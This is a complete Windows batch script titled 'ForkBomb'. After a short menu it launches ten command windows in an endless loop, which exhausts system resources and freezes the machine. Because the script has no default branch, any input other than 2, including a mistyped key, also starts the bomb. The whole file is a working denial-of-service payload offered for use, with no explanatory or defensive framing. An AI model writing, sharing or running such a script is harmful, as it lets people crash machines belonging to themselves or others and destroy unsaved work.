@echo off
title ForkBomb
mode 40, 20
chcp 65001 >nul
call powershell exit >nul
color B


:main
echo what do you want to happan 
echo do you want to run this script
echo by pressing (1) or you can 
echo exit by pressing (2) 

set /p input=
if /I "%input%" EQU "1" goto runfork
if /I "%input%" EQU "2" goto exit


:runfork 
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
goto runfork 



:exit 
exit 1 


